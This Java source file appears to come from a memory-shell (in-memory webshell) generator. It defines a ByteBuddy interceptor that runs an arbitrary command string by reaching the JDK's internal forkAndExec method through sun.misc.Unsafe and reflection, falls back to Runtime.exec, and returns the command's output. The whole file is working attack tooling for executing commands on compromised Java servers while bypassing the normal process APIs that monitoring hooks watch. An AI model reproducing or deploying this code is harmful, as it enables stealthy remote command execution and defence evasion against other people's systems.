package com.reajason.javaweb.memshell.generator.command;

import net.bytebuddy.asm.Advice;

import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

/**
 * @author ReaJason
 * @since 2025/5/25
 */
public class ForkAndExecInterceptor {
    @Advice.OnMethodExit
    public static void enter(@Advice.Argument(value = 0) String cmd, @Advice.Return(readOnly = false) InputStream returnValue) throws IOException {
        try {
            String[] strs = cmd.split("\\s+");
            Class<?> unsafeClass = Class.forName("sun.misc.Unsafe");
            java.lang.reflect.Field unsafeField = unsafeClass.getDeclaredField("theUnsafe");
            unsafeField.setAccessible(true);
            Object unsafe = unsafeField.get(null);

            Class<?> processClass = null;

            try {
                processClass = Class.forName("java.lang.UNIXProcess");
            } catch (ClassNotFoundException e) {
                processClass = Class.forName("java.lang.ProcessImpl");
            }
            Object processObject = unsafeClass.getMethod("allocateInstance", Class.class).invoke(unsafe, processClass);

            byte[][] args = new byte[strs.length - 1][];
            int size = args.length;

            for (int i = 0; i < args.length; i++) {
                args[i] = strs[i + 1].getBytes();
                size += args[i].length;
            }

            byte[] argBlock = new byte[size];
            int i = 0;

            for (byte[] arg : args) {
                System.arraycopy(arg, 0, argBlock, i, arg.length);
                i += arg.length + 1;
            }

            int[] envc = new int[1];
            int[] std_fds = new int[]{-1, -1, -1};
            byte[] bytes = strs[0].getBytes();
            byte[] result = new byte[bytes.length + 1];
            System.arraycopy(bytes, 0,
                    result, 0,
                    bytes.length);
            result[result.length - 1] = (byte) 0;
            try {
                Field helperpathField = processClass.getDeclaredField("helperpath");
                helperpathField.setAccessible(true);
                byte[] helperpathObject = (byte[]) helperpathField.get(processObject);

                Field launchMechanismField = processClass.getDeclaredField("launchMechanism");
                launchMechanismField.setAccessible(true);
                Object launchMechanismObject = launchMechanismField.get(processObject);
                int mode = 0;
                try {
                    Field value = launchMechanismObject.getClass().getDeclaredField("value");
                    value.setAccessible(true);
                    mode = (Integer) value.get(launchMechanismObject);
                } catch (NoSuchFieldException e) {
                    int ordinal = (Integer) launchMechanismObject.getClass().getMethod("ordinal").invoke(launchMechanismObject);
                    mode = ordinal + 1;
                }

                Method forkMethod = processClass.getDeclaredMethod("forkAndExec", int.class, byte[].class, byte[].class, byte[].class, int.class,
                        byte[].class, int.class, byte[].class, int[].class, boolean.class);
                forkMethod.setAccessible(true);
                forkMethod.invoke(processObject, mode, helperpathObject, result, argBlock, args.length,
                        null, envc[0], null, std_fds, false);
            } catch (NoSuchFieldException e) {
                // JDK7
                Method forkMethod = processClass.getDeclaredMethod("forkAndExec", byte[].class, byte[].class, int.class,
                        byte[].class, int.class, byte[].class, int[].class, boolean.class);
                forkMethod.setAccessible(true);
                forkMethod.invoke(processObject, result, argBlock, args.length,
                        null, envc[0], null, std_fds, false);
            }

            try {
                Method initStreamsMethod = processClass.getDeclaredMethod("initStreams", int[].class);
                initStreamsMethod.setAccessible(true);
                initStreamsMethod.invoke(processObject, std_fds);
            } catch (NoSuchMethodException e) {
                // JDK11
                Method initStreamsMethod = processClass.getDeclaredMethod("initStreams", int[].class, boolean.class);
                initStreamsMethod.setAccessible(true);
                initStreamsMethod.invoke(processObject, std_fds, false);
            }

            Method getInputStreamMethod = processClass.getMethod("getInputStream");
            getInputStreamMethod.setAccessible(true);
            returnValue = ((InputStream) getInputStreamMethod.invoke(processObject));
        } catch (Throwable e) {
            returnValue = Runtime.getRuntime().exec(cmd).getInputStream();
        }
    }
}
